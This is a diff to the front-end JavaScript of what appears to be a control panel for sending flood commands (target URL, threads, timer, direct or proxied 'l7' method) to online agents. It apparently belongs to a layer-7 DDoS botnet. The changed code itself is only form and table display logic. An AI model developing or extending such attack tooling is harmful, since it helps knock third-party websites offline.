@@ -59,6 +59,21 @@ document.addEventListener("DOMContentLoaded", () => {
     formError.classList.remove("visible");
   }
 
+  // ── Form interactions ──────────────────────────────────────────────────────
+  
+  const methodSelect = document.getElementById("method");
+  const proxyTypeField = document.getElementById("proxyTypeField");
+  
+  if (methodSelect && proxyTypeField) {
+    methodSelect.addEventListener("change", () => {
+      if (methodSelect.value === "l7p") {
+        proxyTypeField.style.display = "";
+      } else {
+        proxyTypeField.style.display = "none";
+      }
+    });
+  }
+
   // ── Agent status ───────────────────────────────────────────────────────────
 
   function updateOnlineCount() {
@@ -114,6 +129,7 @@ document.addEventListener("DOMContentLoaded", () => {
   // Key: `${url}|${threads}|${timer}`, value: timestamp ms. Entries expire after 5 s.
   const recentSubmits = new Map();
  
+  // command: { action, url, threads, timer, custom_host, method, proxy_type }
   function addHistoryRow(command, fromSSE = false) {
     const dedupeKey = `${command.url}|${command.threads}|${command.timer}`;
  
@@ -133,9 +149,15 @@ document.addEventListener("DOMContentLoaded", () => {
     const tr = document.createElement("tr");
     tr.classList.add("history-new");
  
-    const fields = ["method", "url", "threads", "timer", "custom_host"];
+    const fields = ["method", "proxy_type", "url", "threads", "timer", "custom_host"];
     tr.innerHTML = `<td>${escapeHTML(new Date().toLocaleString())}</td>` +
-      fields.map(k => `<td>${command[k] != null ? escapeHTML(command[k]) : "—"}</td>`).join("");
+      fields.map(k => {
+        let val = command[k];
+        if (k === "method") {
+          val = val === "l7" ? "Direct" : (val === "l7p" ? "Proxy" : val);
+        }
+        return `<td>${val ? escapeHTML(String(val)) : "—"}</td>`;
+      }).join("");
  
     historyBody.insertBefore(tr, historyBody.firstChild);
     setTimeout(() => tr.classList.add("visible"), 10);
@@ -245,9 +267,15 @@ document.addEventListener("DOMContentLoaded", () => {
         cmds.forEach(cmd => {
           if (cmd.action !== "start") return;
           const tr = document.createElement("tr");
-          const fields = ["method", "url", "threads", "timer", "custom_host"];
+          const fields = ["method", "proxy_type", "url", "threads", "timer", "custom_host"];
           tr.innerHTML = `<td>${escapeHTML(new Date().toLocaleString())}</td>` +
-            fields.map(k => `<td>${cmd[k] != null ? escapeHTML(cmd[k]) : "—"}</td>`).join("");
+            fields.map(k => {
+              let val = cmd[k];
+              if (k === "method") {
+                val = val === "l7" ? "Direct" : (val === "l7p" ? "Proxy" : val);
+              }
+              return `<td>${val != null ? escapeHTML(String(val)) : "—"}</td>`;
+            }).join("");
           historyBody.appendChild(tr);
         });
       })
